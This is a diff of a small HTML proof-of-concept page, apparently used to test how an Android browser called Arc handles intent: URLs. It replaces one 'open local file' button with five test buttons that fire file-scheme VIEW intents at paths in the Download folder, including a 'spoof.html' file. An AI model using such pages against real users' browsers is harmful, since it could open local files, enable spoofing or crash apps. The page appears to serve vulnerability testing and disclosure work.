@@ -1,35 +1,59 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Intent File Open PoC</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 100px;
-        }
-        button {
-            padding: 15px 25px;
-            font-size: 18px;
-            cursor: pointer;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Arc Intent Crash PoC</title>
+
+<style>
+    body {
+        font-family: Arial;
+        text-align: center;
+        margin-top: 50px;
+    }
+    button {
+        display: block;
+        margin: 10px auto;
+        padding: 12px 20px;
+        font-size: 16px;
+        cursor: pointer;
+    }
+</style>
 </head>
+
 <body>
 
-<h2>Intent PoC - Open Local File</h2>
-<p>Click the button below to trigger the intent:</p>
+<h2>Intent Crash Testing PoC</h2>
+<p>Each button triggers a different intent test</p>
 
-<button onclick="openIntent()">Open Local File</button>
+<button onclick="test1()">Test 1 - Original Payload</button>
+<button onclick="test2()">Test 2 - Simple File Path</button>
+<button onclick="test3()">Test 3 - Non-existing File</button>
+<button onclick="test4()">Test 4 - Minimal Intent</button>
+<button onclick="test5()">Test 5 - No Path Intent</button>
 
 <script>
-function openIntent() {
-    const intentURL = "intent:///storage/emulated/0/Download/0d7ea43ade16c36b7c96761385271ee3-d214c45985fbd1721fb78f971847b261923eb9cd/0d7ea43ade16c36b7c96761385271ee3-d214c45985fbd1721fb78f971847b261923eb9cd/spoof.html#Intent;scheme=file;action=android.intent.action.VIEW;end;";
-    alert("Triggering intent...");
-    window.location.href = intentURL;
+
+function test1() {
+    location.href = "intent:///storage/emulated/0/Download/0d7ea43ade16c36b7c96761385271ee3-d214c45985fbd1721fb78f971847b261923eb9cd/0d7ea43ade16c36b7c96761385271ee3-d214c45985fbd1721fb78f971847b261923eb9cd/spoof.html#Intent;scheme=file;action=android.intent.action.VIEW;end;";
 }
+
+function test2() {
+    location.href = "intent:///storage/emulated/0/Download/test.html#Intent;scheme=file;action=android.intent.action.VIEW;end;";
+}
+
+function test3() {
+    location.href = "intent:///storage/emulated/0/Download/abc123.html#Intent;scheme=file;action=android.intent.action.VIEW;end;";
+}
+
+function test4() {
+    location.href = "intent:///#Intent;scheme=file;end;";
+}
+
+function test5() {
+    location.href = "intent://test#Intent;scheme=file;action=android.intent.action.VIEW;end;";
+}
+
 </script>
 
 </body>
